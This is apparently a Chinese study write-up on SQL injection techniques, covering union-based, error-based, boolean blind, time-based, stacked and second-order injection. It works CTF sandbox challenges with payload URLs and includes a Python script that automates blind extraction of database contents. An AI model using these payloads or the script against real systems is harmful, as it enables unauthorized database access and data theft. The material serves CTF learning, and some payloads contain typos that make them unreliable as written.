-<h2 id="对group-concat和concat-ws的理解"><a href="#对group-concat和concat-ws的理解" class="headerlink" title="对group_concat和concat_ws的理解"></a>对group_concat和concat_ws的理解</h2><ol>
-<li>group_concat可以将多行数据整合为一行</li>
-<li>concat可以将不同数据用第一个参数链接</li>
-<li>可以写group_concat(concat_ws(‘:’,id,email_id))</li>
-</ol>
-<h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><h3 id="判断是否有注入点"><a href="#判断是否有注入点" class="headerlink" title="判断是否有注入点"></a>判断是否有注入点</h3><ol>
-<li>1 and 1=1正确</li>
-<li>1 and 1=2不正确，所以可以判断是整数型注入</li>
-</ol>
-<h3 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h3><ol>
-<li>order by 1,2,3,4….</li>
-<li>可以使用二分法来判断</li>
-<li>为下一步联合查询爆数据库名奠定基础</li>
-<li>数据库ctf</li>
-<li><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20230528112808285.png" alt="image-20230528112808285"></li>
-<li><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20230528112918701.png" alt="image-20230528112918701"></li>
-</ol>
-<h3 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="爆数据库名"></a>爆数据库名</h3><ol>
-<li>?id=1 and 1=2 union select 1.database()</li>
-<li>注意此处联合查询需要前后字段数量一致，且字段数与上一步使用order by 判断的一致</li>
-<li><a target="_blank" rel="noopener" href="https://imgtu.com/i/HgvkKf"><img src="https://s4.ax1x.com/2022/02/15/HgvkKf.md.png" alt="HgvkKf.md.png"></a></li>
-</ol>
-<h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><ol>
-<li>?id=1 and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_name= ‘sqli’</li>
-<li>group_concat()函数是用来将多行转为一行，将组中的字符串连接成为具有各种选项的单个字符串</li>
-<li>table_name</li>
-<li>information_schema.tables</li>
-<li>1’ and 1=2 union select 1,2,group_concat(username) from ctfshow_web.ctfshow_users where id=1  –+</li>
-</ol>
-<h3 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h3><ol>
-<li>?id=1 and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name=’flag’</li>
-<li>column_name</li>
-<li>information_schema.columns</li>
-<li>table_name</li>
-</ol>
-<h3 id="查询flag"><a href="#查询flag" class="headerlink" title="查询flag"></a>查询flag</h3><ol>
-<li>?id=1 and 1=2 union select 1,group_concat(flag) from sqli.flag</li>
-<li>根据库中的表来查询所有的列中带flag的</li>
-<li><a target="_blank" rel="noopener" href="https://imgtu.com/i/HgvAr8"><img src="https://s4.ax1x.com/2022/02/15/HgvAr8.md.png" alt="HgvAr8.md.png"></a></li>
-</ol>
-<h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><h3 id="判断能否根据输入的不同结果不同"><a href="#判断能否根据输入的不同结果不同" class="headerlink" title="判断能否根据输入的不同结果不同"></a>判断能否根据输入的不同结果不同</h3><ol>
-<li>输入1，2，3…看是否有不同的数据</li>
-</ol>
-<h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><ol>
-<li>1 and 1=1;和1 and 1=2都没错</li>
-<li>1’ and 1=1 –+ 没有问题</li>
-<li>1’ and 1=2 –+报错</li>
-<li>报错是爆出语法错误</li>
-<li>后面加上–+是为了产生闭合，屏蔽掉后面的多余单引号</li>
-</ol>
-<h3 id="判断字段数量"><a href="#判断字段数量" class="headerlink" title="判断字段数量"></a>判断字段数量</h3><ol>
-<li>?id=1’ order by 2 没问题</li>
-<li>?id=1’ order by 3 有问题</li>
-</ol>
-<h3 id="爆数据库名-1"><a href="#爆数据库名-1" class="headerlink" title="爆数据库名"></a>爆数据库名</h3><ol>
-<li>?id=1’ and 1=2 union select 1,database() –+</li>
-<li>得到数据库名为sqli</li>
-</ol>
-<h3 id="爆表名-1"><a href="#爆表名-1" class="headerlink" title="爆表名"></a>爆表名</h3><ol>
-<li>?id=1’ and 1=2 union select 1,group_concat(concat_ws(‘:’,table_name)) from information_schema.tables where table_name=’flag’ –+</li>
-</ol>
-<h3 id="爆字段内容"><a href="#爆字段内容" class="headerlink" title="爆字段内容"></a>爆字段内容</h3><ol>
-<li>?id=1’ and 1=2 union select 1,group_conat(concat_ws(‘:’,flag)) from sqli.flag</li>
-<li><a target="_blank" rel="noopener" href="https://imgtu.com/i/H2sSTH"><img src="https://s4.ax1x.com/2022/02/15/H2sSTH.md.png" alt="H2sSTH.md.png"></a></li>
-</ol>
-<h3 id="buuctf中的warmup"><a href="#buuctf中的warmup" class="headerlink" title="buuctf中的warmup"></a>buuctf中的warmup</h3><ol>
-<li>输入1和1’来判断是字符型还是数字型，发现是字符型注入</li>
-<li>使用1’ or 1=1 #来万能绕过</li>
-</ol>
-<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><ol>
-<li>extractvalue():从目标xml中返回包含所查询的字符串</li>
-<li>EXTRACTVALUE(XML_document,XPath_string)</li>
-<li>第一个参数：XML_document是String格式，为XML文档对象的名称</li>
-<li>第二个参数：Xpath_string(xpath格式的字符串)</li>
-<li>concat:返回结果为连接参数产生的字符串</li>
-</ol>
-<h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><ol>
-<li>updatexml(xml_document,xpath_string,new_value)</li>
-<li>第一个参数：xml_document是string格式，为xml文档对象的名称</li>
-<li>第二个参数：xpath_string</li>
-<li>第三个参数：new_value,string格式，替换查找到符合条件的数据</li>
-</ol>
-<h4 id="用database-爆数据库"><a href="#用database-爆数据库" class="headerlink" title="用database()爆数据库"></a>用database()爆数据库</h4><h1 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h1><ol>
-<li>information_schema.tables有表名</li>
-<li>information_schema.columns有列名</li>
-</ol>
-<h1 id="table"><a href="#table" class="headerlink" title="table"></a>table</h1><ol>
-<li>table_schema=’数据库名字’,数据库的名称</li>
-<li>table_name=’表的名字’,查询满足某些条件的表名</li>
-<li>table_type表的类型</li>
-</ol>
-<h2 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="extractvalue函数原理"><a href="#extractvalue函数原理" class="headerlink" title="extractvalue函数原理"></a>extractvalue函数原理</h3><ol>
-<li>对xml文件进行查询的函数，会从xml文件中返回所包含查询值的字符串，语法：<pre class="line-numbers language-none"><code class="language-none">extractvalue(&#39;xml_document&#39;,&#39;Xpath_string&#39;)
-extractvalue(&#39;目标文件名&#39;,;&#39;在xml中查询的字符串&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
-<li>第二个参数要求是xpath格式的字符串，语法正确是会按照路径 <strong>/该xml文件/要查询的字符串</strong> 进行查询 </li>
-<li>如果我们输入的Xpath_string不对就会报错，而如果页面回显sql报错信息就可以得到我们想要的信息了。</li>
-<li>此处的xml_document可以是anything</li>
-</ol>
-<h3 id="而如果页面回显sql报错信息就可以得到我们想要的信息了"><a href="#而如果页面回显sql报错信息就可以得到我们想要的信息了" class="headerlink" title="而如果页面回显sql报错信息就可以得到我们想要的信息了"></a>而如果页面回显sql报错信息就可以得到我们想要的信息了</h3><h3 id="拼接方法"><a href="#拼接方法" class="headerlink" title="拼接方法"></a>拼接方法</h3><ol>
-<li>使用concat函数拼接一个错误的Xpath让mysql报错得到包含查询值的字符串<pre class="line-numbers language-none"><code class="language-none">select(extractvalue(1,concat(0x7e,database)));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>修改database()部分可以爆表，列，值</li>
-<li>concat存在的意义就是让extractvalue函数的第二个参数出错，所以concat拼接的参数是个非法字符就行</li>
-</ol>
-<h4 id="extractvalue函数一次只能查询32长度"><a href="#extractvalue函数一次只能查询32长度" class="headerlink" title="extractvalue函数一次只能查询32长度"></a>extractvalue函数一次只能查询32长度</h4><ol>
-<li>所以在爆表，列，值的时候需要加上limit x,1逐一查询（<strong>limit m,n跳过前m项数据后获取n条记录</strong>）<pre class="line-numbers language-none"><code class="language-none">假设有三列
-select 1,2,(extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema &#x3D; &#39;security&#39; limit 0,1&#x2F;1,1&#x2F;2,1))))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
-</ol>
-<h5 id="例题ctfshow报错注入"><a href="#例题ctfshow报错注入" class="headerlink" title="例题ctfshow报错注入"></a>例题ctfshow报错注入</h5><ol>
-<li><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-cd4501bf2d967240.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1 and extractvalue(1,concat(0x7e,database())) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://s2.loli.net/2022/06/30/L6tXebY2BRmcihF.png"></p>
-</li>
-<li><p><img src="https://s2.loli.net/2022/06/30/AofUYCxwuaN87Sl.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-eddaa6cf232442c3.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1 and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;&#39;sqli&#39; limit 0,1)))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li><p><a target="_blank" rel="noopener" href="http://challenge-eddaa6cf232442c3.sandbox.ctfhub.com:10800/?id=1">http://challenge-eddaa6cf232442c3.sandbox.ctfhub.com:10800/?id=1</a> and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’flag’ limit 0,1)))–+</p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="http://challenge-eddaa6cf232442c3.sandbox.ctfhub.com:10800/?id=1">http://challenge-eddaa6cf232442c3.sandbox.ctfhub.com:10800/?id=1</a> and extractvalue(1,concat(0x7e,(select flag from flag limit 0,1))) –+<br><img src="https://s2.loli.net/2022/06/30/CIZz2LtPobcvmsf.png"></p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="http://challenge-eddaa6cf232442c3.sandbox.ctfhub.com:10800/?id=1">http://challenge-eddaa6cf232442c3.sandbox.ctfhub.com:10800/?id=1</a> and extractvalue(1,concat(0x7e,(select flag from flag limit 1,1))) –+</p>
-</li>
-<li><p>然后就爆完了</p>
-</li>
-</ol>
-<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><ol>
-<li>所谓盲注就是在服务器没有错误回显的时候完成注入攻击。</li>
-<li>原理：boolean 根据注入信息返回true or fales 没有任何报错信息</li>
-<li>即布尔盲注一般适用于页面没有回显字段(不支持联合查询)，<strong>且web页面返回True或者false</strong>，构造SQL语句，<strong>利用and，or等关键字来其后的语句 true 、 false使web页面返回true或者false</strong>，从而达到注入的目的来<strong>获取信息</strong>的一种方法</li>
-</ol>
-<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><pre class="line-numbers language-none"><code class="language-none">playload：and length(database()) &#x3D;8 --+ &#x2F;判断数据库名长度
-是否等于8
-如果不等于
-则返回错，并且返回index.php
-如果等于就返回query_success<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<ol>
-<li>如果是错误，会回显报错</li>
-<li>如果是正确的，会返回开始页面</li>
-</ol>
-<h3 id="例题：ctfhub布尔盲注"><a href="#例题：ctfhub布尔盲注" class="headerlink" title="例题：ctfhub布尔盲注"></a>例题：ctfhub布尔盲注</h3><ol>
-<li>这一道题我看其它人的wp是数据库为空时还会返回空，一般情况下是数据库为空或者查询语句报错时都会报错，所以应该先判断空时是否会报错?id=1 and 0=1 –+</li>
-<li><strong>判断数据库名字的长度</strong><a target="_blank" rel="noopener" href="http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1">http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1</a> and length(database()) = 3 –+<br><img src="https://s2.loli.net/2022/06/30/hSZvJtQV8sMkuHy.png"></li>
-<li><strong>判断数据库名字的长度</strong><a target="_blank" rel="noopener" href="http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1">http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1</a> and length(database()) = 4 –+<br><img src="https://s2.loli.net/2022/06/30/hSZvJtQV8sMkuHy.png"></li>
-<li><strong>判断数据库名字</strong><a target="_blank" rel="noopener" href="http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1">http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1</a> and database() = ‘sqli’ –+<br><img src="https://s2.loli.net/2022/06/30/Y9RJbZPQgTdApBn.png"></li>
-<li><strong>判断数据库中表的名字</strong><a target="_blank" rel="noopener" href="http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1">http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1</a> and (select table_name from information_schema.tables where table_schema=’sqli’ limit 0,1) = ‘flag’ –+ 这个地方加limit 0,1是因为不只有一个表<br><img src="https://s2.loli.net/2022/06/30/1CJVp3ueS5MZlbf.png"></li>
-<li><strong>判断flag表中字段的名字</strong><a target="_blank" rel="noopener" href="http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1">http://challenge-bd35c68c095833d0.sandbox.ctfhub.com:10800/?id=1</a> and (select column_name from information_schema.columns where table_name=’flag’ limit 0,1) = ‘flag’ –+<br><img src="https://s2.loli.net/2022/06/30/rXfJiRvAY9UZT62.png"></li>
-<li>后面实在是写不出来了，就跑一下吧<pre class="line-numbers language-none"><code class="language-none">import requests
-import time
-
-urlOPEN &#x3D; &#39;http:&#x2F;&#x2F;challenge-80bbba4d1e9ce716.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;&#39;
-starOperatorTime &#x3D; [] 
-mark &#x3D; &#39;query_success&#39;
- 
-def database_name():
-	name &#x3D; &#39;&#39;
-	for j in range(1,9):
-		for i in &#39;sqcwertyuioplkjhgfdazxvbnm&#39;:
-			url &#x3D; urlOPEN+&#39;if(substr(database(),%d,1)&#x3D;&quot;%s&quot;,1,(select table_name from information_schema.tables))&#39; %(j,i)
-			# print(url+&#39;%23&#39;)
-			r &#x3D; requests.get(url)
-			if mark in r.text:
-				name &#x3D; name+i
-				
-				print(name)
-				
-				break
-	print(&#39;database_name:&#39;,name)
-	
-		
-	
-database_name()
- 
-def table_name():
-    list &#x3D; []
-    for k in range(0,4):
-        name&#x3D;&#39;&#39;
-        for j in range(1,9):
-            for i in &#39;sqcwertyuioplkjhgfdazxvbnm&#39;:
-                url &#x3D; urlOPEN+&#39;if(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit %d,1),%d,1)&#x3D;&quot;%s&quot;,1,(select table_name from information_schema.tables))&#39; %(k,j,i)
-			    # print(url+&#39;%23&#39;)
-                r &#x3D; requests.get(url)
-                if mark in r.text:
-                    name &#x3D; name+i
-                    break
-        list.append(name)
-    print(&#39;table_name:&#39;,list)
-
-#start &#x3D; time.time()
-table_name()
-#stop &#x3D; time.time()
-#starOperatorTime.append(stop-start)
-#print(&quot;所用的平均时间： &quot; + str(sum(starOperatorTime)&#x2F;100))
-
-def column_name():
-    list &#x3D; []
-    for k in range(0,3): #判断表里最多有4个字段
-        name&#x3D;&#39;&#39;
-        for j in range(1,9): #判断一个 字段名最多有9个字符组成
-            for i in &#39;sqcwertyuioplkjhgfdazxvbnm&#39;:
-                url&#x3D;urlOPEN+&#39;if(substr((select column_name from information_schema.columns where table_name&#x3D;&quot;flag&quot;and table_schema&#x3D; database() limit %d,1),%d,1)&#x3D;&quot;%s&quot;,1,(select table_name from information_schema.tables))&#39; %(k,j,i)
-                r&#x3D;requests.get(url)
-                if mark in r.text:
-                    name&#x3D;name+i
-                    break
-        list.append(name)
-    print (&#39;column_name:&#39;,list)
-
-column_name()
-
-def get_data():
-        name&#x3D;&#39;&#39;
-        for j in range(1,50): #判断一个值最多有51个字符组成
-            for i in range(48,126):
-                url&#x3D;urlOPEN+&#39;if(ascii(substr((select flag from flag),%d,1))&#x3D;%d,1,(select table_name from information_schema.tables))&#39; %(j,i)
-                r&#x3D;requests.get(url)
-                if mark in r.text:
-                    name&#x3D;name+chr(i)
-                    print(name)
-                    break
-        print (&#39;value:&#39;,name)
-    
-get_data()
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li>最后用这个脚本跑出来了<h3 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h3><pre class="line-numbers language-none"><code class="language-none">一.
-1.count()函数：统计查询结果的数量；
-2.length(str)函数：返回字符串 str的长度；
-3.left()函数： left(database(),1)&#x3D;‘s’ left(a,b)从左侧截取a的前b位，正确则返回1，错误返回0
-left((select database()),1)&#x3D;‘s’ 同样的意思
-4.regexp : select user() regexp ‘r’; user()的结果是root@localhost，regexp为匹配root的正则表达式
-5.like : select user() like ‘ro%’; 匹配与regexp相似
-6.substr(a,b,c): select substr() xxxx; substr(a,b,c)从位置b开始，截取a字符串的c位长度
-7.mid(a,b,c): select mid(user(),1,2); mid(a,b,c)从位置b开始，截取a字符串的c位长度
-8.ascii() 将某个字符转化为其ascii值
-9.limit 0,1：元素索引是从0开始（不是1） 从元素索引位置为1的数据（即第2位）开始输出一个值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-</ol>
-<h2 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><ol>
-<li>由于服务器端拼接了SQL语句，且正确和错误存在同样的回显，即是错误信息被过滤，可以通过页面响应时间进行按位判断数据。由于时间盲注中的函数是在数据库中执行的，但是sleep函数或者benchmark函数的过多执行会让服务器负载过高</li>
-</ol>
-<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ol>
-<li>通过一个页面加载的时间延时来判断</li>
-<li>但是这和网络，性能，设置的延时长短有关系</li>
-<li>当对数据库进行查询操作，如果查询的条件不存在，语句执行的速度非常快，执行时间基本可以认为是0，通过控制sql语句的执行时间来判断</li>
-<li>我认为就是后端设置，当不设置查询条件时，语句执行就会非常快，执行时间基本可以认为是0，后端设置了不到多少时间的查询就不会显示数据</li>
-</ol>
-<h3 id="函数-2"><a href="#函数-2" class="headerlink" title="函数"></a>函数</h3><h4 id="延时函数"><a href="#延时函数" class="headerlink" title="延时函数"></a>延时函数</h4><h4 id="if-exp1-exp2-exp3"><a href="#if-exp1-exp2-exp3" class="headerlink" title="if(exp1,exp2,exp3)"></a>if(exp1,exp2,exp3)</h4><ol>
-<li>当exp1的值为true时会执行exp2,否则会执行exp3</li>
-</ol>
-<h5 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h5><ol>
-<li>睡眠函数，可以使查询数据时回显数据的相应时间加长</li>
-<li>sleep(N) 这里N是睡眠的时间</li>
-<li>使用时可以配合if使用<pre class="line-numbers language-none"><code class="language-none">if(ascii(substr(user(),1,1)) &#x3D; 114,sleep(5),2) 这句话的意思是，如果user()中的第一个字符的ascii码为114时，睡眠5s，否则输出2，需要注意的是，这5s是在服务器的数据库中延迟的，实际情况可能会由于网络环境等因素延迟更长时间<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-</ol>
-<h4 id="benchmark函数"><a href="#benchmark函数" class="headerlink" title="benchmark函数"></a>benchmark函数</h4><ol>
-<li>benchmark函数原本是用来重复执行某个语句的函数</li>
-<li>benchmark(N,expression)</li>
-<li>N是执行的次数，expression是表达式，如果需要进行盲注，通常需要进行消耗时间和性能的计算，例如哈希计算函数MD5，将MD5函数重复执行数万次则可以达到延迟的效果，而具体的情况西药根据不同比赛的服务器性能来决定</li>
-</ol>
-<h3 id="实现过程："><a href="#实现过程：" class="headerlink" title="实现过程："></a>实现过程：</h3><h4 id="判断注入点-1"><a href="#判断注入点-1" class="headerlink" title="判断注入点"></a>判断注入点</h4><ol>
-<li><p>和1=1返回页面相同，说明不是布尔盲注，是时间盲注</p>
-<pre class="line-numbers language-none"><code class="language-none">1&#39; and 1&#x3D;1 --+ 页面返回有数据
-1&#39; and 1&#x3D;2 --+ 页面返回也有数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
-<li><p>判断可以使用的注入方法</p>
-<pre class="line-numbers language-none"><code class="language-none">sleep()判断能否利用时间盲注
-1&#39; and sleep(5) --+ 页面延时了，则为时间盲注<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
-<li><p>猜数据库名称长度</p>
-<pre class="line-numbers language-none"><code class="language-none">1&#39; and if(length(database()) &#x3D; 10,sleep(5),1) --+ 页面延时了，则当前数据库名称长度为10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li><p>猜测数据库名称(ASCII码)</p>
-<pre class="line-numbers language-none"><code class="language-none">1&#39; and if(ascii(substr(database()))&#x3D;107,sleep(5),1) --+ 如果页面延时了，则第一个字符的ascii码值为107<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-</ol>
-<h3 id="逻辑判断"><a href="#逻辑判断" class="headerlink" title="逻辑判断"></a>逻辑判断</h3><ol>
-<li>判断长度<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&#39; and if(length(database())&#x3D;8,sleep(10),1) --+ 如果页面窗口转了10s，说明长度为8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>猜测字符（<strong>数据库名</strong>第一位）<br>?id=1’ and if(mid(database(),1,1)=’s’,10,0) –+ 如果页面跳转了10s，说明database的第一个字符为s</li>
-<li>猜测字符(<strong>猜测第一个表名</strong>的第一位)</li>
-</ol>
-<h3 id="例题-ctfhub时间盲注"><a href="#例题-ctfhub时间盲注" class="headerlink" title="例题:ctfhub时间盲注"></a>例题:ctfhub时间盲注</h3><ol>
-<li>判断数据库名字长度<br><img src="https://s2.loli.net/2022/07/02/HZmto3NRM4vAlcS.png"></li>
-<li>用二分法逐个字符判断数据库名字，例如这个地方先判断了第一个字符是s，（<strong>ascii(s) = 115</strong>）<br><img src="https://s2.loli.net/2022/07/02/ONKdQMlPenB8YoE.png"><br><img src="https://s2.loli.net/2022/07/02/LxQ9gR72DrIyqTG.png"></li>
-<li>判断数据库中表的个数<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-24d32a3bc03290f9.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1 and if((select count(table_name) from information_schema.tables where table_schema&#x3D;&#39;sqli&#39;) &#x3D; 2,sleep(10),0) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<img src="https://s2.loli.net/2022/07/02/LxQ9gR72DrIyqTG.png"></li>
-<li>逐个字符判断数据库中表的名字，(此处ascii(f) = 102)<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-24d32a3bc03290f9.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1 and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1)) &#x3D; 102,sleep(10),0) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<img src="https://s2.loli.net/2022/07/02/fOi4p3JN1MxbqGH.png"></li>
-<li>猜测flag表的字段数<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-24d32a3bc03290f9.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1 and if((select count(column_name) from information_schema.columns where table_name &#x3D; &#39;flag&#39;) &#x3D; 1,sleep(10),0) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-</ol>
-<h2 id="堆叠注入："><a href="#堆叠注入：" class="headerlink" title="堆叠注入："></a>堆叠注入：</h2><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><h3 id="例题：sqli-labs38"><a href="#例题：sqli-labs38" class="headerlink" title="例题：sqli-labs38"></a>例题：sqli-labs38</h3><ol>
-<li><a target="_blank" rel="noopener" href="http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;">http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;</a> union select 1,2,database() –+<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712135428.png"></li>
-<li><a target="_blank" rel="noopener" href="http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;">http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;</a> union select 1,2,(select table_name from information_schema.tables where table_schema=database() limit 0,1) –+      得到一共四个表<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712135922.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140048.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140103.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140115.png"></li>
-<li><a target="_blank" rel="noopener" href="http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;">http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;</a> union select 1,2,(select column_name from information_schema.columns where table_name =’users’ limit 0,1) –+<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140251.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140309.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140324.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140334.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140348.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140402.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140415.png"></li>
-<li><a target="_blank" rel="noopener" href="http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;">http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;</a> union select 1,2,(select group_concat(id) from security.users limit 0,1) –+<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140627.png"></li>
-</ol>
-<h4 id="注意是information-schema"><a href="#注意是information-schema" class="headerlink" title="注意是information_schema"></a>注意是information_schema</h4><ol>
-<li>是下划线不是点，命名时数字字母下划线，没有点！！！</li>
-<li>点表示选择，而information_schema是一个表</li>
-</ol>
-<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ol>
-<li>必须含有<strong>insert</strong>和<strong>update</strong>函数</li>
-<li>变量可控<h3 id="原理：-绕过转义注入-魔术引号"><a href="#原理：-绕过转义注入-魔术引号" class="headerlink" title="原理： 绕过转义注入 魔术引号"></a>原理： <strong>绕过转义</strong>注入 魔术引号</h3></li>
-<li>已经存储（数据库，文件）的用户输入被读取后再次进入到SQL查询语句中导致的注入</li>
-<li>二次注入的原理，在第一次进行数据库插入数据的时候，使用了 addslashes 、get_magic_quotes_gpc、mysql_escape_string、mysql_real_escape_string等函数对其中的特殊字符进行了转义，但是addslashes有一个特点就是<strong>虽然参数在过滤后会添加 “\” 进行转义</strong>，但是<strong>“\”并不会插入到数据库中</strong>，在写入数据库的时候还是<strong>保留了原来的数据</strong>。在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中<strong>取出了脏数据</strong>，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。<br>比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。</li>
-</ol>
-<h4 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h4><ol>
-<li>注册用户（插入数据）：    insert xiaodi union select’</li>
-<li>过滤：        xiaodi union select&#39;</li>
-<li>进入数据库：  xiaodi union select’</li>
-<li>修改用户（修改数据库中的数据）：    update xiaodi union select’ 条件=用户名是谁  xiaodi’ union select update注入</li>
-</ol>
-<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol>
-<li>插入恶意数据：进行数据库插入数据时，对其中的特殊字符进行了转义处理（<strong>转义只是为了校验</strong>），在写入数据库时又<strong>还原</strong>了原来的数据</li>
